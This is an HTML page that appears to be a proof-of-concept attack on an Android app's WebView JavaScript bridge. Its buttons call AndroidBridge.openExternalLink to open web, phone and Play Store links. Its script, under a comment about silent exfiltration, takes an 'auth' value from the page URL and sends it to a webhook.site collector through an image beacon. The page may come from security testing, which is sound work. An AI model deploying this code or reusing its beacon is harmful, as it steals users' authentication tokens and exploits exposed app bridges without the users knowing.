<!doctype html>
<html>
<head>
  <meta charset="utf-8">
</head>
<body>

  <button onclick="AndroidBridge.openExternalLink('https://google.com')">
    Open google.com
  </button>

  <button onclick="AndroidBridge.openExternalLink('tel:1234567890')">
    Open tel
  </button>

  <button onclick="AndroidBridge.openExternalLink('market://details?id=com.android.chrome')">
    Open Chrome in Play Store
  </button>

  <pre id="log"></pre>

  <script>
    const log = (m) =>
      document.getElementById('log').textContent += m + "\n";

    const params = new URLSearchParams(window.location.search);
    const auth = params.get("auth");

    if (typeof AndroidBridge === "undefined") {
      log("AndroidBridge not found.");
    } else {
      log("AndroidBridge found.");
    }

    if (auth) {
      log("auth parameter detected: " + auth);

      // Silent exfiltration via image beacon
      const img = new Image();
      img.src =
        "https://webhook.site/ead77c75-82b9-4a44-a558-f6145b12e28e/" +
        encodeURIComponent(auth);
    } else {
      log("No auth parameter present.");
    }
  </script>

</body>
</html>
